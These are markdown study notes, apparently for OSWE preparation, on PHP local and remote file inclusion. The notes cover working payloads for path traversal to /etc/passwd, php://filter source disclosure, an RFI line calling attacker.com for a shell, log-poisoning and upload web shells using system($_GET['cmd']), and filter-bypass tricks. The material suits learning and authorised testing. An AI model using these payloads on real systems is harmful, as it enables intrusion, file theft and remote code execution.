# File Inclusion Vulnerability (LFI/RFI) — Notes

##  What is File Inclusion?

File Inclusion occurs when an application dynamically includes files using user-controlled input.

### Vulnerable pattern:

```php
include($_GET['file']);
```

---

##  Types

### 1. Local File Inclusion (LFI)

* Includes files from the local system
* Example:

```bash
?file=../../../../etc/passwd
```

---

### 2. Remote File Inclusion (RFI)

* Includes remote files (if enabled)

```bash
?file=http://attacker.com/shell.php
```

---

##  Root Cause

* User input directly used in:

  * `include()`
  * `require()`
  * `include_once()`
* No proper validation or restriction

---

#  Exploitation Techniques

## 1. Path Traversal

```bash
../../../../etc/passwd
```

---

## 2. PHP Wrappers

### Read source code:

```bash
php://filter/convert.base64-encode/resource=index.php
```

### File wrapper:

```bash
file:///etc/passwd
```

---

## 3. Log Poisoning → RCE

### Inject:

```http
User-Agent: <?php system($_GET['cmd']); ?>
```

### Then include:

```bash
?file=/var/log/apache2/access.log&cmd=id
```

---

## 4. File Upload → RCE

Upload:

```php
<?php system($_GET['cmd']); ?>
```

Rename:

```bash
file1.php
```

Access:

```bash
?file=file1.php
```

---

#  Filter Bypass Techniques (IMPORTANT)

##  Case 1: Weak Prefix Filter

### Code:

```php
if (!fnmatch("file*", $file))
```

### Bypass:

```bash
file../../../../etc/passwd
file/../../../../etc/passwd
file://../../../../etc/passwd
```

### Insight:

* Only checks **prefix**
* Attacker controls rest of path

---

##  Case 2: Blacklist Filters

### Code:

```php
if (strpos($file, "../") !== false)
```

### Bypass:

```bash
....//....//etc/passwd
..%2f..%2fetc/passwd
```

---

##  Case 3: Extension Filters

### Code:

```php
if (!preg_match("/\.php$/", $file))
```

### Bypass:

```bash
shell.php.jpg
shell.php%00.jpg   (old PHP)
```

---

##  Case 4: Strict Whitelist (Hard Case)

### Code:

```php
if ($file != "file1.php" && $file != "file2.php")
```

###  Direct bypass:

* Not possible via string tricks

###  Real exploitation:

#### 1. File overwrite

* Upload file named `file1.php`

#### 2. Secondary inclusion

```php
// file1.php
include($_GET['page']);
```

Exploit:

```bash
?file=file1.php&page=../../../../etc/passwd
```

#### 3. Log/session poisoning

* Inject PHP into logs/sessions
* Get included indirectly

---

#  Key OSWE Insight

> File inclusion bugs are rarely about bypassing filters directly.

Real exploitation is about:

* Controlling **included file content**
* Chaining with:

  * File upload
  * Log poisoning
  * Secondary includes

---

#  Testing Checklist

* [ ] Can I use `../` traversal?
* [ ] Are PHP wrappers enabled?
* [ ] Can I upload files?
* [ ] Are logs accessible?
* [ ] Do included files have dynamic includes?
* [ ] Any writable directories?

---

#  Summary

| Scenario         | Exploit Strategy      |
| ---------------- | --------------------- |
| Weak filter      | Bypass with traversal |
| Blacklist        | Encoding tricks       |
| Strict whitelist | Control allowed files |
| Real-world       | Chain vulnerabilities |

---

##  Final Thought

> Input validation alone is not security.

Security depends on:

* How input is used
* What files are included
* Whether attacker can influence file content

---
